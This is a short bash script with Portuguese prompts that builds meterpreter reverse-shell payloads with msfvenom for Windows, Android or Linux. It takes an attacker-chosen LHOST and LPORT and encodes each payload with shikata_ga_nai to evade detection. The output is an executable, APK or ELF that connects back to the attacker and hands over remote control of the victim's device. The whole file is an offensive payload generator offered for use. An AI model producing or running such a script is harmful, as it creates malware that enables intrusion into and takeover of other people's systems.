#!/bin/bash

echo "Escolha a plataforma do exploit:"
echo "1. Windows"
echo "2. Android"
echo "3. Linux"

read platform

echo "Escolha o LHOST:"
read lhost

echo "Escolha o LPORT:"
read lport

case $platform in
  1)
    echo "Criando exploit Windows..."
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -f exe > windows_exploit.exe
    ;;
  2)
    echo "Criando exploit Android..."
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -f apk > android_exploit.apk
    ;;
  3)
    echo "Criando exploit Linux..."
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -f elf > linux_exploit.elf
    ;;
  *)
    echo "Plataforma inválida. Saindo..."
    exit 1
    ;;
esac

echo "Exploit criado com sucesso!"
